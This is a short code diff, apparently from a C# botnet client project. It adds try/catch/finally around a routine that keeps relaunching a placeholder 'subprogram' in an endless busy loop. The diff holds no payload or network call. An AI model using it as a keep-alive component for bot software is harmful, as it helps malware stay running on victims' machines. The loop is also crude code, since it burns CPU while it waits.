@@ -12,18 +12,31 @@ namespace BotNetClient
     {
         public static void miniprog()
         {
-            Process proc = Process.Start("Путь к подпрограмме");
-            while (true)
+            try
             {
-                if (!proc.HasExited)
+                Process proc = Process.Start("Путь к подпрограмме");
+                while (true)
                 {
+                    if (!proc.HasExited)
+                    {
 
-                }
-                else
-                {
-                    proc.Start();
+                    }
+                    else
+                    {
+                        proc.Start();
+                    }
                 }
             }
+            catch (Exception)
+            {
+
+                throw;
+            }
+            finally
+            {
+                Program.miniprogram = null;
+            }
+            
         }
     }
 }
